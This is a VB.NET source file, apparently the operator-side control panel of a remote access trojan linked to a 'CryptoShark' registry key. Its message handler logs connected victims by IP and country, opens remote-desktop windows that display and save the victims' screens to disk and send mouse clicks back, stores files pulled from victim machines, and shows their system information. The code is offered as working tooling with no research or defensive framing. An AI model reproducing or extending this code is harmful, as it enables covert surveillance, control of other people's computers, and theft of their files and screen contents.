Imports System.IO
Imports System.IO.Compression
Imports GMap.NET
Imports GMap.NET.MapProviders
Imports GMap.NET.WindowsForms
Imports GMap.NET.WindowsForms.Markers

Public Class CClient2

    Public Shared F As Form1
    Delegate Sub _Read(ByVal C As tlscclient, ByVal b() As Byte)
    Public Shared GetCountry As GeoIP = New GeoIP((Application.StartupPath & "\GeoIP.dat"))



    Public Shared Sub Read(ByVal C As tlscclient, ByVal b() As Byte)
        Try
            Dim A As String() = Split(BS(AES_Decryptor(b, C)), Gclass1.SPL)
            Select Case A(0)

                Case "INFO"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Try

                            For Each XX In Strings.Split(My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark", "Block", Nothing), (","))
                                If XX.Contains(C.IP.ToString.Split(":")(0)) Or XX.Contains(A(1)) Then
                                    If Not Gclass1.Blocked.Contains(C.IP.ToString.Split(":")(0)) Then
                                        Gclass1.Blocked.Add(C.IP.ToString.Split(":")(0))
                                    End If
                                    C.isDisconnected()
                                    Return
                                End If
                            Next
                        Catch ex As Exception
                            Debug.WriteLine(ex.Message)
                        End Try

                        Try
                            C.LV = F.l1.Items.Insert(0, C.IP.Split(":")(0), GetCountry.LookupCountryCode(C.IP.Split(":")(0)) & ".png")
                            C.LV.Tag = C
                            C.LV.SubItems.Add(GetCountry.LookupCountryName(C.IP.Split(":")(0)))
                            For i As Integer = 1 To A.Length - 1
                                C.LV.SubItems.Add(A(i))
                            Next
                            F.l1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)



                            Gclass1.Online.Add(C)

                            log(C.IP.Split(":")(0), True)



                        Catch ex As Exception
                            Debug.WriteLine(ex.Message)
                        End Try
                    End If
                    Exit Sub

                Case "RD-"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As FrmDesktop = My.Application.OpenForms("Desktop : " + A(3))
                        If RD Is Nothing Then
                            RD = New FrmDesktop
                            RD.C = C
                            RD.CID = A(3)
                            RD.Name = "Desktop : " + A(3)
                            RD.Text = "Desktop : " + A(3)
                            RD.Sz = New Size(A(1), A(2))
                            RD.Show()
                        End If
                    End If
                    Exit Sub

                Case "RD+"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As FrmDesktop = My.Application.OpenForms("Desktop : " + A(4))
                        If RD IsNot Nothing Then
                            RD.Text = "Desktop : " + A(4) + " [" + BytesToString(b.LongLength) + "]"
                            Dim MM = Image.FromStream(New IO.MemoryStream(Text.Encoding.Default.GetBytes(A(1))))
                            RD.Sz = New Size(A(2), A(3))

                            RD.PictureBox1.Image = MM

                            If RD.ToolStripStatusLabel4.ForeColor = System.Drawing.SystemColors.ControlText Then
                                Try
                                    MM.Save(Application.StartupPath & "\Downloads" & "\" & A(4) & "\Desktop" & "\" & DateAndTime.Now.ToString("yyMMddhhmmssfff") & ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg)
                                Catch ex As Exception
                                    RD.ToolStripStatusLabel4.ForeColor = System.Drawing.SystemColors.ControlText
                                End Try
                            End If


                            If RD.Button2.Text = "Start" Then
                                If RD.ToolStripStatusLabel2.ForeColor = System.Drawing.SystemColors.ControlText Then
                                    If RD.op = Nothing Then
                                    Else
                                        Dim pp As New Point(0, 0)
                                        pp.X = RD.op.X
                                        pp.Y = RD.op.Y
                                        RD.op = Nothing
                                        Dim B2 As Byte() = SB("###" & Gclass1.SPL & pp.X & Gclass1.SPL & pp.Y & Gclass1.SPL)
                                        Try
                                            Dim ClientReq As New Outcoming_Requests(C, B2)
                                            Pending.Req_Out.Add(ClientReq)
                                        Catch ex As Exception
                                        End Try
                                    End If
                                End If
                                Dim Bb As Byte() = SB("RD+" + Gclass1.SPL + RD.PictureBox1.Width.ToString + Gclass1.SPL + RD.PictureBox1.Height.ToString + Gclass1.SPL + RD.ComboBox1.Text.Replace("%", "").ToString)
                                Try
                                    Dim ClientReq As New Outcoming_Requests(C, Bb)
                                    Pending.Req_Out.Add(ClientReq)
                                Catch ex As Exception
                                End Try
                            End If

                        End If
                    End If
                    Exit Sub

                Case "downloadedfile"
                    If Not IO.Directory.Exists(Application.StartupPath & "\Downloads") Then
                        IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads")
                    End If
                    If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & A(3)) Then
                        IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & A(3))
                    End If

                    Try
                        IO.File.WriteAllBytes(Application.StartupPath & "\Downloads" & "\" & A(3) & "\" & A(2), Convert.FromBase64String(A(1)))

                    Catch ex As Exception
                    End Try




















                Case "getinfo"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As FrmInfo = My.Application.OpenForms("Information : " + A(1))
                        If RD Is Nothing Then
                            RD = New FrmInfo
                            RD.C = C
                            RD.CID = A(1)
                            RD.Name = "Information : " + A(1)
                            RD.Text = "Information : " + A(1)
                            RD.Show()
                        End If
                    End If
                    Exit Sub


                Case "Xinfo"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As FrmInfo = My.Application.OpenForms("Information : " + A(2))
                        If RD IsNot Nothing Then

                            RD.Text = "Information : " + A(2)

                            If A(1) = Nothing Then
                                RD.ToolStripStatusLabel1.ForeColor = Color.Red
                                RD.ToolStripStatusLabel1.Text = "Error!"
                                Return
                            End If

                            RD.TextBox1.Text = (A(1))
                            RD.TextBox1.SelectionStart = RD.TextBox1.Text.Length
                            RD.TextBox1.ScrollToCaret()
                            RD.TextBox1.Refresh()
                            RD.ToolStripStatusLabel1.ForeColor = Color.Green
                            RD.ToolStripStatusLabel1.Text = "Successfully!"
                        End If
                    End If
                    Exit Sub






























































































            End Select
            Exit Sub
        Catch ex As Exception
            Debug.WriteLine("Messages" + ex.Message)
        End Try
    End Sub
    Public Shared Function smethod_5(byte_0 As Byte(), ByRef bool_0 As Boolean) As Byte()
        If bool_0 Then
            Dim memoryStream As MemoryStream = New MemoryStream()
            Dim gZipStream As GZipStream = New GZipStream(memoryStream, CompressionMode.Compress, True)
            gZipStream.Write(byte_0, 0, byte_0.Length)
            gZipStream.Dispose()
            memoryStream.Position = 0L
            Dim array As Byte() = New Byte(CInt(memoryStream.Length) + 1 - 1) {}
            memoryStream.Read(array, 0, array.Length)
            memoryStream.Dispose()
            Return array
        End If
        Dim memoryStream2 As MemoryStream = New MemoryStream(byte_0)
        Dim gZipStream2 As GZipStream = New GZipStream(memoryStream2, CompressionMode.Decompress)
        Dim array2 As Byte() = New Byte(3) {}
        memoryStream2.Position = memoryStream2.Length - 5L
        memoryStream2.Read(array2, 0, 4)
        Dim num As Integer = BitConverter.ToInt32(array2, 0)
        memoryStream2.Position = 0L
        Dim array3 As Byte() = New Byte(num - 1 + 1 - 1) {}
        gZipStream2.Read(array3, 0, num)
        gZipStream2.Dispose()
        memoryStream2.Dispose()
        Return array3
    End Function

End Class
